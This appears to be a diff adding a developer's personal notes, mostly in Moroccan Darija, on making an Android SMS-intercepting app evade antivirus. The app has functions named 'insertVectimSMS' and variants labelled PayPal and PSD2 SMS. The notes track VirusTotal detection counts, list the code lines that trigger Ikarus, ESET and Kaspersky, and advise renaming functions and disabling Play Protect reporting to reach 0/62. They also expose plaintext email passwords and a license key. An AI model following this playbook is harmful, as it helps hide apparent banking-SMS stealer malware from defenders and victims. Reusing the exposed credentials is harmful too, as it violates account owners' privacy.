@@ -1,0 +1,152 @@
+ATTENTION:
+1: JAMAIS TSCANER LAPP DYALEK FSITAT ONLINE DYAL SCAN + MATSCANIHCH FTEL BLANTIVIRUSES ONTA MCONNECTER(DECONNECTA OSCANER AW RUN)
+2: LVITUAL WINDOWS DARORE TA3TEH 60GB lfo9
+3: GOOGLE PLAY PROTECTION:
+   ida bghiti ta3raf wach mdecliner man lpalay protection or no:
+   1: darore dir laggiornamento lga3 lapps ida bghitih iscaner mezyan=> Play store=> 3 dyal chartat lli 3la lesar=> Le mie app e i miei giochi => Aggiorna tutti.
+   2: ida sma7tilih itinstala wakha lplay protection galik virus fadarore ida bghiti testeh lmarra jaya tformate tel.
+   3: jamais tasma7 lapp itinstala ida galik lplay protection rah virus, 7it ida sma7ti yatinstala famab9iti ta9dar ta3raf wach mdetecter ola la illa 3an tari9 lformatage.
+   4: darore khassek tamna3 irsal lapp dyalek lgoogle ida instalitih from unknown sources(wakha maykounch medetecter taydetecta ida khallitiha ON) : ghatamchi=> 
+      GOOGLE PLAY=> 3DYAL CHARTAT LLI 3LA LESAR => Play Protect => lbutton dyal setting lli kina lfo9 3la liman=> DISABLE: Improve harmful app detection.
+
+
+
+
+
+NORTON comprato
+
+ludovica.zambello11@gmail.com
+Turella@8888
+XX8X37X9WTXVBB68P3TJG32Y4
+
+
+MCAFEE(DARORE TINSTALIH HOW LAWEL)
+kaspersky 
+ESET
+AVG
+AVAST
+depaumassimo86@hotmail.com
+Massino/2333
+
+
+
+DEEFFREEZ:
+https://www.faronics.com/fr/products/deep-freeze/enterprise
+depaumassimo86@hotmail.com
+Massino/2333
+
+
+
+
+
+PPL SMS: wallat 22/62 first scan at 2021-03-11
+https://www.virustotal.com/gui/file/9f81d1e28477876ce38eaaff8cc6d369a836ffec379f42f6918b151e852521e3/detection
+
+PPL SMS+NOTE: 05/62
+https://www.virustotal.com/gui/file/5382c7928137ab94c125157a31f2ff92fd7f36e994d29888086584129e9c27a8/detection
+
+PSD2 SMS+NOTE:  06/62
+https://www.virustotal.com/gui/file/093b601377ff13634dc0d27abf8472e8f3d6033fde53940804d692c879223634/detection
+
+
+
+
+
+
+IMPORTANT NOTICES:
+DETECTET AT(4): Ikarus + ESET-NOD32 + Kaspersky + ZoneAlarm.
+
+
+ALL
+1- when i deleted all functions at IncomingSms class :
+ DETECTED AT(1): Ikarus.
+
+
+void insertVectimSMS
+2- when i deleted juste the: void insertVectimSMS function :
+ DETECTED AT(2): Ikarus + ESET-NOD32.
+
+
+onReceive()
+3- when i deleted juste the:onReceive():
+ DETECTED AT(2): Ikarus + Kaspersky.
+
+
+intent = intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
+4- when i deleted juste the: intent = intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);:
+  DETECTED AT(3): Ikarus + Kaspersky + ESET-NOD32
+
+
+class LongOp
+5- when i deleted juste the: class LongOp:
+ DETECTED AT(3): Ikarus + ESET-NOD32 + Kaspersky.
+
+
+SimpleDateFormat fmat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss a"); fmat.format(today) + intent = intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
+6- when i deleted : SimpleDateFormat fmat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss a"); fmat.format(today); + intent = intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES):
+ DETECTED AT(2): Ikarus + Kaspersky
+
+
+"jdbc:mysql://mydataflow10.mysql.database.azure.com:3306/database_flow?useSSL=true&requireSSL=false";
+7- hada: "jdbc:mysql://mydataflow10.mysql.database.azure.com:3306/database_flow?useSSL=true&requireSSL=false";
+ taydecter Ikarus.
+
+
+
+
+SOLUTIONS:
+- change all functions + variables names at IncominSms class.
+- change this at all classe from: 
+  "jdbc:mysql://mydataflow10.mysql.database.azure.com:3306/database_flow?useSSL=true&requireSSL=false";
+  TO:
+  "jdbc:mysql://mydataflow10.mysql.database.azure.com:3306/database_flow?useSSL=true&requireSSL=true";
+- delete this from onReceive():
+  intent = intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);:
+  +
+  SimpleDateFormat fmat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss a"); fmat.format(today); + intent = intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES):
+= 0/62
+
+- change name of this function: insertVectimData()
+
+
+
+
+NEW: 05/05
+
+KASPERSKY:
+- insertVectimData() had smiya mdeclinya
+
+
+ESET:
+hado detectaw trojan.
+-handler.putString("sergtse", " + WAITING");
+-return "userDataOk";
+-hanf.apply();
+-currentMSG.getDisplayMessageBody();
+
+
+AVG:
+SONY:
+hada detecta trojan
+CloudRep
+ATTENTION:
+7atta new project detecta fel avg fi kobiton.com
+
+
+
+NEW: 12/05
+PayPal Protection:
+1: ESET
+
+Antivirus:
+0
+
+
+
+
+
+JARRABT FTEL:
+-KASPER
+-AVAST + ESET + avg
+
+
